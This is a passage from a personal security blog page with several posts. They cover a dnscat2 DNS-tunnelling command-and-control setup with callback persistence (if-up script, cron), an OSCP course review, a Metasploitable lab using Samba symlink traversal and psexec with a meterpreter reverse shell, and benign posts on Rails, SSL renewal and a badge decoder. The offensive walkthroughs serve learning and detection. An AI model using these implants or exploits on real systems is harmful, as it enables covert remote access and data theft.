-
-<h3 id="authoritative-dns">Authoritative DNS</h3>
-
-<p>Configure an authoritative name server on the DNS provider account. Using namecheap for instance:</p>
-
-<p>Manage Domain &gt; Advanced DNS &gt; Add Personal DNS Servers &gt; <code>ns1 == ip.ad.dre.ss</code> and <code>ns2 == ip.ad.dre.ss</code></p>
-
-<p>Then, under Domain &gt; Use Custom DNS &gt; use <code>ns1.examplecom</code> and <code>ns2.example.com</code></p>
-
-<p>Check this is working by running on the server: <code>sudo nc -vv -l -u -p53</code> and from another machine <code>nslookup ns1.example.com</code> to verify traffic is hitting this IP.</p>
-
-<h3 id="set-up-dnscat2-server-side">Set up dnscat2 server side</h3>
-
-<p>Log in to your VPS, get dnscat2, and install it.</p>
-
-<pre><code># apt-get update
-# apt-get -y install ruby-dev git make g++
-# gem install bundler
-# git clone https://github.com/iagox86/dnscat2.git
-# cd dnscat2/server
-# bundle install
-</code></pre>
-
-<p>And start the server.</p>
-
-<pre><code># ruby /home/admin/dnscat2/server/dnscat2.rb --secret=verysecret ns1.example.com
-</code></pre>
-
-<h3 id="configure-the-client-raspberry-pi">Configure the client/Raspberry Pi</h3>
-
-<h4 id="compile-the-dnscat2-client">Compile the dnscat2 client</h4>
-
-<p>On the Raspberry Pi or client</p>
-
-<pre><code>$ git clone https://github.com/iagox86/dnscat2.git
-$ cd dnscat2/client/
-$ make
-</code></pre>
-
-<p>At this point you can run dnscat2 with the following to confirm things are working. We&rsquo;ll be coming back to this so no need to keep in running.</p>
-
-<pre><code>$ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
-</code></pre>
-
-<ul>
-<li>You can also leave out the domain and instead specify an ip: <code>./dnscat --dns=server=1.2.3.4,port=53</code> but this is a direct connection out port 53 which may be blocked. It also clearly shows dnscat2 on the wire and will likely be flagged by IDS/IPS</li>
-<li>You can specify various DNS record types but TXT records have been fairly stable for me in the past</li>
-</ul>
-
-<h4 id="configure-persistance">Configure Persistance</h4>
-
-<p>We want our little remote computer to always be connected to us. Every time it&rsquo;s plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there&rsquo;s always a callback.</p>
-
-<p>Make <code>eth0</code> ask for a DHCP address everytime it&rsquo;s plugged in</p>
-
-<pre><code>$cat /etc/networking/interfaces
-  auto eth0
-  allow-hotplug eth0
-  iface eth0 inet dhcp
-</code></pre>
-
-<p>Add an <code>interface up</code> start script</p>
-
-<pre><code>$cat /home/rpi/start_dnscat2
-  #!/bin/bash    
-  echo &quot;[+] Starting dnscat2...&quot;
-  tmux new -s dnscat -d /home/rpi/dnscat2/client/dnscat ns1.example.com
-$ln -s  /home/rpi/start_dnscat2 /etc/network/if-up.d/start_dnscat2
-$chmod +x /home/rpi/start_dnscat2
-</code></pre>
-
-<p>Configure <code>cron</code> to check every five minutes if <code>dnscat2</code> is running and start it if not.</p>
-
-<pre><code>$cat check_and_start_dnscat2.sh 
-#!/bin/bash
-
-if ! $(ps aux | grep -i &quot;[t]mux&quot; &gt; /dev/null); then
-    echo &quot;[!] Starting dnscat2...&quot;
-        /home/rpi/start_dnscat2
-else
-    echo &quot;[+] dnscat2 is running...&quot;
-fi
-
-$crontab -e
-*/5 * * * * /home/rpi/check_and_start_dnscat2.sh
-</code></pre>
-
-<p>That&rsquo;s it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.</p>
-
-<h3 id="dnscat2-reference">dnscat2 reference</h3>
-
-<p>dnscat2 isn&rsquo;t super intuitive so some operational notes for quick reference:</p>
-
-<ul>
-<li>Start the server under a tmux session</li>
-<li>Within the dnscat2 prompt, type <code>sessions</code> to see what you have available and interact with <code>sessions -i 1</code></li>
-<li>Within a session type <code>help</code> to list available commands and <code>shell</code> then <code>session -i &lt;window#&gt;</code> for an interactive shell</li>
-<li>Exit the shell session by <code>Control-z</code> or <code>exit</code></li>
-</ul>
-
-<h3 id="identifying-dnscat2-on-the-wire">Identifying dnscat2 on the wire</h3>
-
-<p>There are number of ways to identify malicious DNS traffic and <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">this SANS paper</a> details quite a few methods of identification. In addition, in this case we&rsquo;re specifying TXT records which aren&rsquo;t too common. <a href="http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf">One paper</a> (Table 1) puts TXT record usage around 7% of a given large sample size. <a href="http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html">Another</a> puts that usage at closer to less than 1%.</p>
-
-<p>It&rsquo;s difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who&rsquo;s not careful is likely to be identified.</p>
-
-<h3 id="resources">Resources</h3>
-
-<p>Most of this info is from iagox86&rsquo;s github and Lenny Zeltser&rsquo;s write up on dnscat2.</p>
-
-<ul>
-<li><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></li>
-<li><a href="https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md">https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md</a></li>
-<li><a href="https://zeltser.com/c2-dns-tunneling/">https://zeltser.com/c2-dns-tunneling/</a></li>
-<li><a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152</a></li>
-</ul>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/opendnss-appsec-training-lab/">
-        OpenDNS&#39;s AppSec Training Lab
-      </a>
-    </h1>
-
-    <span class="post-date">Sun, Aug 23, 2015</span>
-
-    <p>I came across OpenDNS Security Ninjas AppSec <a href="https://github.com/opendns/Security_Ninjas_AppSec_Training">Training Lab</a> not too long ago and found its simplicity rather enjoyable. It&rsquo;s a simple web app written in PHP which illustrates each of the <a href="https://www.owasp.org/index.php/Top_10_2013-Table_of_Contents">OWASP Top 10</a> categories. As I was going through the exercises I found myself checking to see how the vulnerable code was written and how the issues could be remediated.</p>
-
-<p>Since the lab is geared towards beginners, I thought it might be helpful to provide brief explanations along with links to the relevant lines of source code. For each level/OWASP vulnerability, I simply added a &ldquo;Why&rdquo; section to each &ldquo;Solution&rdquo; area linking to the sink on Github along with a brief explanation.</p>
-
-<p>The merge request is apparently pending an OpenDNS maintainer, but the fork is on <a href="https://github.com/thesubtlety/Security_Ninjas_AppSec_Training">Github</a>.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/the-oscp-penetration-testing-with-kali-linux/">
-        The OSCP | Penetration Testing With Kali Linux
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Dec 20, 2014</span>
-
-    
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/pwk-box-small-128x150.png" />
-    
-    
-</figure>
-
-
-<p>I&rsquo;ve spent the last few months working through the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/">Penetration Testing with Kali Linux</a> course by Offensive Security which has been an awesome <a href="http://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">learning</a> experience.</p>
-
-<p>Much has been said on this course and I&rsquo;ll only briefly go over my experience and takeaways. The following reviews were helpful in making the decision to take the course.</p>
-
-<ul>
-<li>Review by <a href="https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/">g0tmi1k</a></li>
-<li>Review by <a href="http://fourfourfourfour.co/2014/04/20/oscp-review/">recrudesce</a></li>
-<li>Review from <a href="http://buffered.io/posts/oscp-and-me/">Buffered.io</a></li>
-<li>Review from <a href="http://www.iodigitalsec.com/offensive-security-pwb-course-and-oscp-certification-review/">IODigitalSec</a></li>
-<li>Review from <a href="http://www.securitysift.com/offsec-pwb-oscp/">SecuritySift</a></li>
-</ul>
-
-<p><br/>
-For a little preview of what&rsquo;s involved, check out the free <a href="http://www.offensive-security.com/metasploit-unleashed/Main_Page">Metasploit Unleashed</a> course.</p>
-
-<p><strong>Material, Course, and Exam</strong></p>
-
-<p>After completing the 300+ page <a href="http://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">pdf material</a>, <a href="http://www.offensive-security.com/about-us/">muts</a>-narrated videos and exercises, I
-focused my attention on the lab. It is at this point, when the course turns from a more academic focus to an applied and practical nature, that the magnitude of what one is learning begins to sink in. A lab with nearly fifty diverse machines across multiple networks awaits with no further instructions. But with enumeration comes vulnerable machines, and each machine is different. Some are simple to exploit, some are difficult, some are incredibly frustrating. Every one is rewarding.</p>
-
-<p>Several months later, after getting root or system access on nearly every machine, and completing a final lab penetration test report of over two hundred pages, I felt ready for the 24 hour exam. Exam day had me giddy as a little kid and went smoothly. Ten hours in I had enough points to pass but I spent another eight hours attempting to privilege escalate my way to system on one remaining machine. I eventually succumbed to exhaustion knowing I had more than enough points to pass and wishing to be functional the next day to write up my exam report.</p>
-
-<p>Several days after submitting the exam report along with my final lab report, I received the much-anticipated email stating that I had passed the exam and now held my Offensive Security Certified Professional certification. I have mixed feelings about the value of certifications since just about anyone can take a test and pass. But this one - this one a person has to work for.</p>
-
-<p><strong>A few take aways</strong></p>
-
-<p>Document, document, document</p>
-
-<ul>
-<li>I used Keepnote on my host machine to track everything. It&rsquo;s certainly not without its frustrations, but it does the job. Don&rsquo;t forget to back everything up!</li>
-<li>Write up every machine after popping, including a summary and detailed steps along with key screenshots - you will thank yourself later. It&rsquo;s easy to forget, and coming back a few weeks or months later while writing up your report because you forgot something and finding your documentation didn&rsquo;t include some small issue is frustrating.
-<br /></li>
-</ul>
-
-<p><br/>
-Enumeration is key</p>
-
-<ul>
-<li>Every single machine is vulnerable and exploitable, it&rsquo;s simply a matter of finding it.</li>
-<li>Reset boxes before attempting them, especially Windows. I spent many an unneeded hour working through possible exploits when a SMB service had simply
-been crashed by a previous student and Metasploit would have gotten me in immediately.</li>
-<li>Privilege escalation provides lessons in patience. The following resources were invaluable.
-
-<ul>
-<li><a href="http://www.greyhathacker.net/?p=738">http://www.greyhathacker.net/?p=738</a></li>
-<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
-<li><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br />
-<br /></li>
-</ul></li>
-</ul>
-
-<p><br/>
-Post exploitation is paramount</p>
-
-<ul>
-<li>Multiple boxes include passwords, scripts, and log files which will provide access or attack vectors to other machines.</li>
-<li>Missing one thing can lead to wasted time chasing down red herrings.</li>
-</ul>
-
-<p><br/>
-Utilize the admins</p>
-
-<ul>
-<li>Make use of the admins on IRC at #offsec. While they won&rsquo;t give you the answer, they often ask questions which get you thinking in a certain way, and simply explaining what steps you have taken can lead to other paths for success.</li>
-</ul>
-
-<p><br/>
-Commit the time</p>
-
-<ul>
-<li>The material covered in this course is not terribly difficult, but it does take practice. And practice requires time. I spent at least fifteen hours every week in the labs over the course of a few months.<br /></li>
-</ul>
-
-<p><br/>
-I think the only dissatisfaction I experienced was while working on a exploiting a machine while another student was attempting to do the same and continually reset the box wiping out any steps taken to obtain a shell for instance. This was rare, though.</p>
-
-<p>Overall, this was an awesome learning experience. If you&rsquo;re thinking about doing it, and you have the time to dedicate, there is no question: just do it. If you actually want to learn and understand the material, rather than just memorize a bunch of information as is the case with so many other certifications, this is for you. It&rsquo;s affordable, lab time is easily extended, admins are almost always available, and the cost is not prohibitive.</p>
-
-<p>Thanks Offensive Security and team for putting together such a fantastic course.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/building-a-web-app-in-rails/">
-        Building a Web App in Rails
-      </a>
-    </h1>
-
-    <span class="post-date">Fri, Apr 11, 2014</span>
-
-    <p>A brilliant <a href="http://blaedj.github.io/">software engineering friend</a> and I were recently discussing with another mutual friend the inefficiencies of employees filling out paper forms after completion of a construction job and the inefficiencies of transferring said forms to excel and so on. Said friend and I figured we could probably fix this with a web app for a nominal fee, but which would greatly increase our mutual friends&rsquo; productivity. A win win situation if there ever was one.</p>
-
-<p>So we set about the process of building a web application in Ruby on Rails. And several weeks later, we had one completed. It&rsquo;s nothing too fancy, but one that is being used in production and is adding business value. And it was an awesome learning experience. I just wanted to highlight some of what we encountered, how we went about the task, and a few lessons learned along the way.</p>
-
-<p>Said friend and I had tinkered with Ruby on Rails before, but never to any great extent, nor had we worked with a business customer in this fashion by building a product to solve a problem, so I&rsquo;m quite pleased with the way our stabbings in the dark went.</p>
-
-<p>We had gotten okay requirements with the first discussions, and putting our collective heads together to make a small pile of rocks, we discussed how long this would take, what tools, libraries, and third party applications to use, where we would be hosting, understanding how we would actually solve the problem, and what to charge. Mutual friend agreed, and off we went.</p>
-
-<p><strong>Working remotely</strong></p>
-
-<p>We worked together remotely on this project. Skype and Google hangouts worked well when our schedules coincided. Starting out, we worked in tandem to get the foundation
-down and a workflow established, and as we became more proficient, our productivity increased as we worked in parallel on different issues. Git, Github, and Heroku make for incredibly painless collaboration. I learned that git is a stupid content tracker, and a great tool. And for small deployments like this one, Heroku&rsquo;s robustness and free-ness were awesome.</p>
-
-<p><strong>On Building</strong></p>
-
-<p>As we hadn&rsquo;t used RoR too much beyond tutorials, we bootstrapped using <a href="http://ruby.railstutorial.org/">Michael Hartl&rsquo;s tutorial</a> to get us started. Unlike many online tutorials, this one has great explanations and security hygiene and explained in great detail the user authentication and authorization pieces (among many others). And gems like bcrypt&rsquo;s has_secure_token for example, makes the implementation of secure passwords brain-dead simple. Rails make things very easy implement. Almost too easy. That opinion is likely due to not having worked too in depth with PHP, Apache, and MySQL. And now that I begin to recall the school projects of years past, RoR is quite nice indeed.</p>
-
-<p>Our requirements didn&rsquo;t have us do anything too difficult, although we certainly had our share of hurdles; both in learning how the framework works and actually solving design problems. Working our way through various database relationships was a challenge, and pretty rewarding once we came up with solutions. Proper inheritance, indexing, and scoping all gave cause for some extra reading. Heroku makes things incredibly easy as far as using APIs, so incorporating email was no problem either.</p>
-
-<p>UI and UX is always interesting. I hate poorly thought out UIs with a passion, so building a sensible interface was important. Yet css, javascript, html, and various cross-platform and browser (in)compatibilities can easily drive one nuts. And since I have no desire to wander about in insanity, we ended up using Bootstrap and HTML5 to keep things simple. And simple is beautiful.</p>
-
-<p><strong>On Changing requirements</strong></p>
-
-<p>And just like any other project, we had multiple feature requests as the weeks went by. All honored because we are kind and generous souls. These things had impacts on our initial estimates, but understandably so from our wonderful customer&rsquo;s perspective.</p>
-
-<p><strong>A Few Lessons Learned</strong></p>
-
-<ul>
-<li><p>Requirements are very important. More time spent at the beginning better understanding how users interact with and use an application is essential.</p></li>
-
-<li><p>Understanding the various differences between mobile and desktop and between various browser rendering is pretty important. For example, we initially used Chrome for testing purposes with things working great. When we got reports back saying dates don&rsquo;t work we were initially baffled. Apparently Firefox doesn&rsquo;t render the date drop down and requires a very specific format.</p></li>
-
-<li><p>Helpful error messages and graceful error handling is paramount to ease user experience.</p></li>
-
-<li><p>Logging and alerting is essential. Multiple times we have been immediately alerted when things break or user experience is poor, allowing us to investigate and resolve.</p></li>
-
-<li><p>Tests are essential. Refactoring a feature should never break existing functionality.</p></li>
-</ul>
-
-<p><strong>On Securing</strong></p>
-
-<p>Fortunately Rails 4 comes with many secure defaults such as protect_from_forgery for example, which adds csrf tokens to forms automatically. There are many great resources out there to help secure web apps. <a href="http://brakemanscanner.org/">Brakeman</a> and <a href="https://github.com/codesake/codesake-dawn">Dawn by Codesake</a> both caught a number of issues that were remediated. And while <a href="https://www.owasp.org/images/8/89/Rails_Security_2.pdf">this</a> resource is aging, and many of the issues outlined in it are remediated in later versions of Ruby, it is a great guide explaining what to look for, why various practices are poor, their consequences, and how to remediate them.</p>
-
-<p>No mention of app sec should be without reference to OWASP. The <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP Top Ten</a> and <a href="https://www.owasp.org/index.php/Secure_SDLC_Cheat_Sheet">Secure SDLC</a> have a plethora of good resources for Builders, Breakers, and Defenders. While this project was fairly ad-hoc, there are enough resources on OWASP for another post and give rise to more than a few questions and places for improvement going forward. The <a href="https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet">OWASP RoR Cheatsheet</a> is a good resource as well. And another: The <a href="http://guides.rubyonrails.org/security.html">RoR Security Guide</a>. There is no end to good resources out there.</p>
-
-<p>Yet another well written and mildly humourous post by Honeybadger is <a href="http://www.honeybadger.io/blog/guides/2013/03/09/ruby-security-tutorial-and-rails-security-guide">here</a> which contains wise advice such as the following.
-<code>match &quot;/launch_all_the_missiles&quot;, to: &quot;missiles#launch_all&quot;
-Conclusion: PANIC!</code></p>
-
-<p>And Kalzumeus&rsquo;s awesome blog and excellent <a href="http://www.kalzumeus.com/2013/01/31/what-the-rails-security-issue-means-for-your-startup/">post</a> on Rails security and startups has a ton of all around great advice.</p>
-
-<p><strong>In Conclusion</strong></p>
-
-<p>While this post is fairly short, I learned an incredible amount from completing this project. From both the technical aspects of working with Ruby on Rails, git, various APIs, and Heroku to the business and customer aspects, this was challenging, fun, and rewarding. And getting to delve into the web app sec world in more detail and have a postive impact on a business application is a reward in its own. Of course maintaining a production web application means the work is never done, so there is that as well. A little lesson all in it&rsquo;s own, I suppose.</p>
-
-<p>Thanks for reading.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/renewing-your-startcom-ssl-cert/">
-        Renewing your StartCom SSL Cert
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Mar 15, 2014</span>
-
-    <p>Since I&rsquo;ve forgotten how to do this over the past year, here are the directions for posterity.</p>
-
-<ol>
-<li><p>Startcom sends you a reminder after 50 weeks and opens a window for a renewal. Log in and validate your email and domain using the Validation Wizard. Note, you need to ensure your email is going to forward properly.</p></li>
-
-<li><p>Generate a key and CSR on the server with the following two commands
-<code>openssl genrsa -out ./www.thesubtlety.com.key 2048</code> 
-<code>openssl req -new -key www.thesubtlety.com.key -out www.thesubtlety.com.csr</code></p></li>
-
-<li><p>Once your domain is validated by StartSSL, you need to request a new certificate which is pretty self explanatory. Use the Certificate Wizard, follow the prompts, and paste in the CSR where asked.</p></li>
-
-<li><p>Once you&rsquo;ve got that, copy it to a .crt file on the server.</p></li>
-
-<li><p>Don&rsquo;t forget the chain file. This can be created by cat-ing the files ca.pem and sub.class1.server.ca.pem <a href="https://www.startssl.com/certs/">here</a> into a .chn file.</p></li>
-</ol>
-
-<p>The NFS SSL help and request link is here: <a href="https://members.nearlyfreespeech.net/username/support/assist?tag=ssl">https://members.nearlyfreespeech.net/username/support/assist?tag=ssl</a></p>
-
-<p>And finally, verify the newly installed cert is updated with a new expiration date.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/just-the-basics/">
-        Just the Basics
-      </a>
-    </h1>
-
-    <span class="post-date">Mon, Feb 17, 2014</span>
-
-    <p>Things have been busy lately, but I&rsquo;ve been doing some reading, learning, and playing around in a small VM lab, and thought to briefly document what I&rsquo;ve done. There is unfortunately nothing groundbreaking here, and nothing too interesting beyond a demonstration.</p>
-
-<pre><code>___  ___       _                      _         _  _   
-|  \/  |      | |                    | |       (_)| |  
-| .  . |  ___ | |_  __ _  ___  _ __  | |  ___   _ | |_ 
-| |\/| | / _ \| __|/ _` |/ __|| '_ \ | | / _ \ | || __|
-| |  | ||  __/| |_| (_| |\__ \| |_) || || (_) || || |_ 
-\_|  |_/ \___| \__|\__,_||___/| .__/ |_| \___/ |_| \__|
-                              | |                      
-                              |_|
-</code></pre>
-
-<p>For this example I&rsquo;ve got Kali Linux, Metasploitable, Windows XP SP2, and Security Onion running. (Time to add some RAM&hellip;) There are a ton of good reference resources out there, and most of this is simply plug and play. The Kali distro isn&rsquo;t packaged with <a href="http://www.tenable.com/products/nessus/select-your-operating-system">Nessus</a>, so that may need downloaded and installed, although certainly not required for our purposes. Nothing fancy here as all machines are on the same subnet and bridged via my host NIC, making traffic sniffing trivial and allowing us to see the (mostly Snort rule) results of this nefarious-ness.</p>
-
-<p>The Metasploit Unleashed <a href="http://www.offensive-security.com/metasploit-unleashed/">guide</a> makes for a handy reference tool for Metasploit and Meterpreter themselves as well as a jumping off point into further research; namely fuzzing, exploit design, and post-exploitation topics. Another handy reference was the second half of this Security Onion <a href="https://code.google.com/p/security-onion/wiki/IntroductionWalkthrough">walkthrough</a>; the example with Sguil that was walked through was both interesting and instructive.</p>
-
-<p>With all of the VMs up and running, msfconsole started in Kali, and with Security Onion listening to our traffic, let&rsquo;s do a little host discover with nmap. Metasploit provides an easy way to automatically populate results into its database with the db_nmap command.</p>
-
-<pre><code>db_nmap -Pn -sS -A 192.168.100.1/24
-</code></pre>
-
-<p>The results are automatically stored and are easily seen with via &lsquo;hosts&rsquo; and &lsquo;services&rsquo;. Exporting normal nmap results to an xml file can allow for easily importing into msf as well.</p>
-
-<pre><code>msf&gt; hosts
-Hosts
-======
-address         mac               name            os_name os_flavor os_sp purpose
--------         ---               ----            ------- --------- ----- -------
-192.168.100.192 de:ad:be:ef:ca:fe 192.168.100.192 Linux   Debian          server
-
-msf&gt; services 192.168.100.192
-Services
-========
-host              port  proto  name   state    info
-----              ----  -----  ----   -----    ----      
-192.168.100.192   21    tcp    ftp    open     ProFTPD 1.3.1
-...
-</code></pre>
-
-<p>Nmap can be a fairly noisy tool as far as traffic generated though, as Sguil/Snorby results show. Snort alerts on fifty or so &lsquo;potential scans&rsquo; and the Nmap scripting engine has very recognizable traffic. If we run nmap without the -A agressive option, we reduce the amount of alerts considerably (from nearly 50 to about 7 or so events generated without the nmap scripts). </p>
-
-
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/nmap_snorby.png" />
-    
-    
-</figure>
-
-
-<p>Tip toeing around Snort rules and timers is an interesting game. Fyodor&rsquo;s Nmap <a href="http://nmap.org/book/">book</a> has quite a bit of information around this and makes for interesting reading. Another thing to note is the default User Agent for Nmap scripts is fairly conspicuous as seen below. According to <a href="http://www.kroosec.com/2012/02/making-nmap-scripting-engine-stealthier.html">this guy</a>, that can be easily changed in the nse lua settings.</p>
-
-<p>Another option for host and vulnerability discovery is via <a href="https://en.wikipedia.org/wiki/Nessus_(software)">Nessus</a>. Nmap and it&rsquo;s version detection can get us a long way, but Nessus will give us a laundry list of poor configurations, out of date services, relevant CVEs, and fixes. The new HTML5 UI is quite nice to use; simply run a scan on your desired targets and export as as a nessus file (xml format) for Metasploit to import.</p>
-
-<p><strong>Anyways</strong></p>
-
-<pre><code>msf&gt; services 192.168.100.192
-Services
-========
-host              port  proto  name        state    info
-----              ----  -----  ----        -----    ----      
-192.168.100.192   21    tcp    ftp         open     ProFTPD 1.3.1
-192.168.100.192   137   udp    nebios-ns   open     
-192.168.100.192   139   tcp    netbios-ssn open     Samba smbd 3.x workgroup
-192.168.100.192   445   tcp    netbios-ssn open     Samba sbbd 3.x workgroup
-</code></pre>
-
-<p>Looks like Samba is running on Metasploitable. <a href="https://www.grc.com/port_137.htm">This</a> page has some background info along with links to RFCs and other relevant netbios info.</p>
-
-<p>In another terminal on Kali let&rsquo;s see what shares are available with &lsquo;smbclient -L //192.168.100.192&rsquo;. Note this generates two low severity &lsquo;GPL NETBIOS SMB unicode share access&rsquo; Snort events. /tmp is available, with a cute &lsquo;oh noes!&rsquo; comment. Hmm, let&rsquo;s try there first.</p>
-
-<pre><code>root@kali:~# smbclient -L //192.168.100.192
-Enter roots's password: &lt;blank&gt;
-Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
-       Sharename         Type       Comment
-       ---------         ----       -------
-       opt               Disk       oh noes!
-...
-
-root@kali:~# smbclient //192.168.100.192/tmp
-Enter roots's password: &lt;blank&gt;
-Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
-smb: \&gt; ls
-  .
-  ..
-  .ICE-unix
-  .X11-unix
-  4608.jsvc_up
-</code></pre>
-
-<p>If we access this  share, we only see the /tmp directory and nothing more. But if the samba configuration allows &lsquo;wide links&rsquo; (which allow symbolic links to be added to a share) and allows write access to a directory, this is &lsquo;exploitable&rsquo; by linking the file system to a directory in /tmp. A decent explanation how this works is on <a href="https://www.samba.org/samba/news/symlink_attack.html">Samba.org</a> and the <a href="http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072944.html">mailing list.</a></p>
-
-<p>Manually, you simply connect via <code>smbclient //192.168.100.192/tmp' anonymously, and enter 'symlink ../../../../../../../../../ rootfs</code> which traverses back to root and links that to your newly created directory. This gives read access to /etc/passwd remotely. Fortunately, permissions are somewhat limited as the user is anonymous. Otherwise, Metasploit can take care of this for us with the Samba Link Traversal <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/samba_symlink_traversal.rb">module</a>.</p>
-
-
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/Selection_002.png" />
-    
-    
-</figure>
-
-
-<p>Once that has completed, open up a terminal, run <code>smbclient -L //192.168.100.192</code>, enter &lsquo;cd rootfs2`, and \etc\passwd is ours. </p>
-
-<p><strong>Other Stuff</strong></p>
-
-<p>Even more fun can be had with the psexec module and a set of credentials. More info on <a href="http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx">psexec</a> and some more good information via <a href="https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified">Rapid7</a> for further reading.</p>
-
-<pre><code>msf &gt; use exploit/windows/smb/psexec
-...
-msf &gt; set payload windows/meterpreter/reverse_tcp
-</code></pre>
-
-<p>Snort catches this with the high severity events<strong> &rsquo;</strong>ET SHELLCODE Possible call with a No Offset TCP Shellcode event&rsquo; and an &lsquo;ET POLICY PE EXE or DLL Windows file download&rsquo;.</p>
-
-
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/Selection_003.png" />
-    
-    
-</figure>
-
-
-<p>This isn&rsquo;t an exploit so to speak, but is an easy way to play around with Meterpreter. <a href="http://www.offensive-security.com/metasploit-unleashed/About_Meterpreter">Meterpreter</a> exists only in memory, but does require a DLL sent to the victim, which as we saw, Snort detected. Meterpreter is an impressive tool; an in depth guide exists <a href="http://dev.metasploit.com/documents/meterpreter.pdf">here</a> (pdf).</p>
-
-<p>Next time I&rsquo;ll try to post something a little more novel that what you&rsquo;ve (maybe) just read. This all feels somewhat script-kiddyish without a solid understanding of exploit development, but a person&rsquo;s got to start somewhere. There is virtually an unfathomable amount of knowledge and things to learn out there. Metasploitable in itself has a ton more to play with, not to mention Multillidae, DVWA, WebGoat, and others. I&rsquo;d best get cracking.</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/bsidesdc-badge/">
-        BSidesDC Badge 
-      </a>
-    </h1>
-
-    <span class="post-date">Tue, Oct 29, 2013</span>
-
-    <p>I recently attended my first security conference: BSidesDC. This isn&rsquo;t a write up of that experience, although it was quite interesting and I learned a lot via some great sessions. One talk I really enjoyed by <a href="https://twitter.com/grecs">@grecs</a> was <a href="https://www.novainfosec.com/2013/10/19/malware-analysis-slides-from-bsidesdc/">Malware Analysis 101</a>. Very well presented with lots of great getting started material.</p>
-
-
-<figure >
-    
-        <img src="https://www.thesubtlety.com/img/bsides-150x150.jpg" />
-    
-    
-</figure>
-
-
-<p>Anyways, the badges. Pretty cool badges; bottle openers in fact, with fourteen binary bytes all with leading zeroes around the circumference: ascii encoded <a href="https://en.wikipedia.org/wiki/Binary_code">binary</a>. The message is trivially found via google, but where&rsquo;s the fun in that? And wanting to play around with Python some more I decided to write something that could decode the binary. My first stab looks like this.</p>
-
-<pre><code>#!/usr/bin/python
-# This was a quick and dirty excercise in Python without googling the answer. 
-# No error checking, etc... Check out the Python unicode page and the BitManipulation
-# page for more info and probably the proper way to do this. 
-
-import argparse
-
-def main():
-
-    #argparse is overkill for this, but was fun to play around with
-    parser = argparse.ArgumentParser(description=&quot;Convert between ascii and binary &quot;
-                                                  and vice verse.&quot;)
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--to_binary', action=&quot;store&quot;, dest=&quot;ascii&quot;, nargs=&quot;+&quot;)
-    group.add_argument('--to_ascii', action=&quot;store&quot;, dest=&quot;bin&quot;, nargs=&quot;+&quot;)
-    args = parser.parse_args()
-
-    #Sends user input to the appropriate function
-    if args.ascii is not None:
-        to_binary(args.ascii)
-    elif args.bin is not None:
-        to_ascii(args.bin)
-
-def to_binary(args):
-    chars_bin = [bin(ord(each)) for each in [item for sublist in args for item in \
-                sublist]] 
-    print &quot; &quot;.join([each[2:].zfill(8) for each in chars_bin])
-    ### The Stack Overflow way
-    ### print ''.join('{:08b}'.format(ord(each)) for each in args) 
-
-def to_ascii(args):
-    print &quot;&quot;.join([(chr(int(str(each),2))) for each in args])
-    ### The Stack Overflow way
-    ### print &quot;&quot;.join(chr(args[i:i+8],2)) for i in xrange(0, len(args), 8)) 
-
-if __name__ == &quot;__main__&quot;: main()
-</code></pre>
-
-<p>And running this with our badge&rsquo;s binary:</p>
-
-<pre><code>python binary_ascii.py --to_ascii 01101001 01101110 01100010 01100101 01100101 \
-01110010 01110111 01100101 01110100 01101000 01101001 01110010 01110011 01110100 
-inbeerwethirst
-
-python binary_ascii.py --to_ascii 01100010 01110011 01101001 01100100 01100101 \
-01110011 01110011 01100101 01100011 01110101 01110010 01101001 01110100 01111001 
-bsidessecurity
-</code></pre>
-
-<p>Much cleverness by the organizers. One side says &ldquo;BSides Security&rdquo; and the other &ldquo;In Beer We Thirst&rdquo;&hellip;</p>
-
-  </div>
-  
-  <div class="post">
